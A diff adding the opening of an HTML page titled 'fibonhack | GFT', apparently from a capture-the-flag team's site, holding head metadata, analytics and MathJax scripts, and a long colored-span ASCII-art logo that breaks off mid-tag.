@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html lang="en">
+
+	<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <title>fibonhack | GFT</title>
+
+    <link rel="stylesheet" href="/assets/css/style.css">
+    <script src="/assets/js/main.js"></script>
+
+    <link rel="shortcut icon" href="/assets/images/favicon.jpg">
+
+    <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?..."></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-167636907-1"></script>
+
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-167636907-1');
+    </script>
+
+</head>
+
+
+		<body class="bg-zinc-900 h-screen flex flex-col justify-between">
+
+			<div>
+    <nav class="w-full p-6 flex flex-col items-center justify-center my-3">
+        <span class="contrast-150 brightness-125 select-none ascii md:text-[0.4rem] text-[0.2rem] md:leading-[0.62rem] leading-[0.32rem]" style="white-space:pre;letter-spacing:0;">
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FCF1E8;"> </span><span style="color:#F98E3A;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F97B25;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F97323;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#FA6A20;">/</span><span style="color:#F99A6A;">*</span><span style="color:#FCFCFB;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FCFCFB;"> </span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F77222;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#F8591B;">(</span><span style="color:#F8561A;">(</span><span style="color:#FCF0EC;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F6F7F7;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F69F2F;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#0F0549;">&amp;</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F97323;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#F8591B;">(</span><span style="color:#D74A21;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#FB511A;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#FDF4F2;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F2F3F4;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#05004C;">&amp;</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F77222;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#F8591B;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#F95019;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#B2B5BD;">,</span><span style="color:#FFFFFF;"> </span><span style="color:#F6AB31;">*</span><span style="color:#F8AA31;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F8A22F;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F89E2E;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F8992D;">/</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#F6912A;">/</span><span style="color:#F9912B;">/</span><span style="color:#F78D29;">/</span><span style="color:#F98C29;">/</span><span style="color:#F78828;">/</span><span style="color:#F98928;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F98026;">/</span><span style="color:#F77D25;">/</span><span style="color:#F97B25;">/</span><span style="color:#F77823;">/</span><span style="color:#F97724;">/</span><span style="color:#F77422;">/</span><span style="color:#F97323;">/</span><span style="color:#F86F21;">/</span><span style="color:#FA6F22;">/</span><span style="color:#F86C20;">/</span><span style="color:#FA6A20;">/</span><span style="color:#F8671F;">(</span><span style="color:#FA661F;">/</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#FA5D1D;">(</span><span style="color:#F85A1C;">(</span><span style="color:#FA5A1C;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#FA551B;">(</span><span style="color:#F85219;">(</span><span style="color:#FB511A;">(</span><span style="color:#F94E18;">(</span><span style="color:#FB4C18;">(</span><span style="color:#F94917;">(</span><span style="color:#FB4817;">(</span><span style="color:#F94516;">(</span><span style="color:#FB4416;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#C8CACF;">,</span><span style="color:#FDFDFD;"> </span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F77222;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#521C3C;">%</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#F95019;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F95E41;">/</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#0E064A;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F97323;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#602239;">%</span><span style="color:#CE4923;">(</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#FB511A;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93A1A;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F8F9F9;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F5B634;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F39F2E;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F6932B;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#5A2C3E;">%</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F77222;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#F85A1C;">(</span><span style="color:#F8591B;">(</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#F95019;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#FA3010;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F7C760;">,</span><span style="color:#F5B734;">*</span><span style="color:#F7B835;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F8AF33;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F89E2E;">/</span><span style="color:#0B044A;">&amp;</span><span style="color:#07014B;">&amp;</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#F98C29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F97B25;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F97323;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#FA6A20;">/</span><span style="color:#F8671F;">(</span><span style="color:#F8651E;">(</span><span style="color:#F8631E;">(</span><span style="color:#100449;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#FA5A1C;">(</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#FB511A;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#FB4817;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#E53218;">#</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#FA3010;">(</span><span style="color:#FC2E11;">(</span><span style="color:#FA2B0F;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FFFFFF;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#F7D177;">,</span><span style="color:#F5B935;">*</span><span style="color:#F5B734;">*</span><span style="color:#F5B634;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#0E054A;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F6912A;">/</span><span style="color:#F78F2A;">/</span><span style="color:#F78D29;">/</span><span style="color:#CF752F;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#422142;">%</span><span style="color:#F98427;">/</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#9F4A31;">#</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#150748;">&amp;</span><span style="color:#F86C20;">/</span><span style="color:#F86920;">/</span><span style="color:#F8671F;">(</span><span style="color:#08014A;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#F8591B;">(</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#F95019;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#F93D14;">(</span><span style="color:#F93B13;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#FA3010;">(</span><span style="color:#FA2E10;">(</span><span style="color:#FA2B0F;">(</span><span style="color:#FA2A0F;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#AFB3BB;">,</span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span><span style="color:#FDFDFD;"> </span>
+	<span style="color:#FDFDFD;"> </span><span style="color:#757C89;">(</span><span style="color:#FDFDFD;"> </span><span style="color:#F5BC36;">*</span><span style="color:#F5B935;">*</span><span style="color:#F5B734;">*</span><span style="color:#F7B835;">*</span><span style="color:#F5B333;">*</span><span style="color:#F5B133;">*</span><span style="color:#F6AF32;">*</span><span style="color:#F6AD32;">*</span><span style="color:#F6AB31;">*</span><span style="color:#F6A931;">*</span><span style="color:#F6A630;">*</span><span style="color:#F8A630;">*</span><span style="color:#F6A32F;">/</span><span style="color:#F6A02E;">/</span><span style="color:#F69E2E;">/</span><span style="color:#F69C2D;">/</span><span style="color:#F69A2D;">/</span><span style="color:#F6982C;">/</span><span style="color:#F6952B;">/</span><span style="color:#F8952C;">/</span><span style="color:#04004B;">&amp;</span><span style="color:#04004B;">&amp;</span><span style="color:#F78D29;">/</span><span style="color:#F78B29;">/</span><span style="color:#F78828;">/</span><span style="color:#F78727;">/</span><span style="color:#F78427;">/</span><span style="color:#08014B;">&amp;</span><span style="color:#F78026;">/</span><span style="color:#F77F25;">/</span><span style="color:#F77D25;">/</span><span style="color:#F77A24;">/</span><span style="color:#F77823;">/</span><span style="color:#F77623;">/</span><span style="color:#F77422;">/</span><span style="color:#F97323;">/</span><span style="color:#F86F21;">/</span><span style="color:#F86E21;">/</span><span style="color:#F86C20;">/</span><span style="color:#50203E;">%</span><span style="color:#04004B;">&amp;</span><span style="color:#B74A2A;">#</span><span style="color:#F8631E;">(</span><span style="color:#FA621E;">(</span><span style="color:#F85F1D;">(</span><span style="color:#F85D1C;">(</span><span style="color:#F85A1C;">(</span><span style="color:#F8591B;">(</span><span style="color:#F8561A;">(</span><span style="color:#F8541A;">(</span><span style="color:#F85219;">(</span><span style="color:#FB511A;">(</span><span style="color:#F94E18;">(</span><span style="color:#F94B18;">(</span><span style="color:#F94917;">(</span><span style="color:#F94716;">(</span><span style="color:#F94516;">(</span><span style="color:#F94315;">(</span><span style="color:#F94115;">(</span><span style="color:#FB3F15;">(</span><span style="color:#04004B;">&amp;</span><span style="color:#F93B13;">(</span><span style="color:#F93813;">(</span><span style="color:#F93612;">(</span><span style="color:#F93411;">(</span><span style="color:#F93211;">(</span><span style="color:#FA3010;">(</span><span style="color:#FC2E11;">(</span><span style="color:#FA2B0F;">(</span><span style="color:#FA2A0F;">(</span><span style="color:#FA280E;">#</span><span style="color:#FDFDFD;"> </span><span style="color:#808692;">/</span><span style="color:#FDFDFD;"> </span><span 